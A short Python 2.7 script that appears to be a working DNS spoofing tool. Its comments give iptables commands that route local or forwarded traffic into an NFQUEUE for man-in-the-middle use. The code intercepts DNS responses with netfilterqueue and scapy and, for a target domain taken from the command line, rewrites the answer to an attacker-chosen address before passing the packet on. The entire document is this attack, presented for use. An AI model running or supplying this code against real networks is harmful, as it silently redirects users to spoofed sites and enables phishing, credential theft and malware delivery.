#!/usr/bin/python2.7
#"iptables -I INPUT -j NFQUEUE --queue-num 0" for localhost dns-spoofing iptables cmd to create a queue
#"iptables -I FORWARD -j NFQUEUE --queue-num 0" for MITM mode but it has some bug 

import netfilterqueue
import scapy.all as scapy
import argparse

parser=argparse.ArgumentParser()	
parser.add_argument("-s","--spoof",dest="swebsite",help="Specify an website to spoof")	
parser.add_argument("-r","--redirect",dest="dwebsite",help="Specify an website to redirect the user")
options = parser.parse_args()

def process_packet(packet):

	scapy_packet = scapy.IP(packet.get_payload())
	if scapy_packet.haslayer(scapy.DNSRR):
		qname = scapy_packet[scapy.DNSQR].qname
		if options.swebsite+"." == qname:
			
			print "[+] Spoofing Target"
			answer = scapy.DNSRR(rrname=qname,rdata=options.dwebsite)
			scapy_packet[scapy.DNS].an = answer
			scapy_packet[scapy.DNS].ancount = 1

			del scapy_packet[scapy.IP].len
			del scapy_packet[scapy.IP].chksum
			del scapy_packet[scapy.UDP].chksum
			del scapy_packet[scapy.UDP].len

			packet.set_payload(str(scapy_packet))

	packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0,process_packet)
queue.run()

